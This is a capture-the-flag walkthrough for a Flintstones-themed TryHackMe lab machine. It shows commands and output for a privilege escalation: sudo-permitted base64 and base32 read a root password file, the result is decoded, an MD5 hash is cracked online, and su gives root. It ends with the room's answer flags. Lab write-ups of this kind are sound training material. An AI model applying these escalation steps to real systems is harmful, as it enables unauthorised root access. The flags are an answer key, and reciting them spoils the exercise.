   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> pass
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')


barney@b3dr0ck:/home/fred$ su fred
Password: YabbaDabbaD0000!
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ cat fred.txt
THM{08da34e619da839b154521da7323559d}

priv esc

fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===

let's use cyberchef

magic wand (so first do b64 then copy in input then magic)

from b64 > from b32 > from b64 > md5 > crackstation

TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg== > LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK >
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK > a00a12aad6b7c16bf07032bd05a31d56 > 	flintstonesvitamins

found :)

fred@b3dr0ck:~$ sudo su
[sudo] password for fred: 
I wave my private parts at your aunties!
[sudo] password for fred: 
You empty-headed animal food trough wiper!
[sudo] password for fred: 
sudo: 3 incorrect password attempts
fred@b3dr0ck:~$ su
Password: 
su: Authentication failure

just su

fred@b3dr0ck:~$ su
Password: 
root@b3dr0ck:/home/fred# cd /root
root@b3dr0ck:~# ls
pass.txt  root.txt  snap
root@b3dr0ck:~# cat pass.txt
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
root@b3dr0ck:~# cat root.txt
THM{de4043c009214b56279982bf10a661b7}



```


What is the barney.txt flag?
 Explore the higher ports, one is ready for a TLS socket with key & cert obtained from port 9009
*THM{f05780f08f0eb1de65023069d0e4c90c}*

What is fred's password?
 You can find it same way as barney's, with fred's credentials (cert + key)
*YabbaDabbaD0000!*

What is the fred.txt flag?

*THM{08da34e619da839b154521da7323559d}*

What is the root.txt flag?
[root pass] Multi encode/decode (+ crackstation ;)
*THM{de4043c009214b56279982bf10a661b7}*




[[Plotted-TMS]]